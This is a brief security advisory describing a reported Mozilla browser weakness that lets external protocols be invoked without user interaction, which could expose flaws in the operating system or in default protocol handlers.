Mozilla Internet Browser is reported prone to a weakness that may permit an external protocol to be called without any user interaction. This may expose Mozilla users to vulnerabilities that exist in the underlying operating system or in the software that is the default handler for a registered protocol.

Vulnerabilities in the applications that are invoked by a protocol, and vulnerabilities in the way a called protocol is handled by the host operating system may be exploited using this weakness in the Mozilla browser.
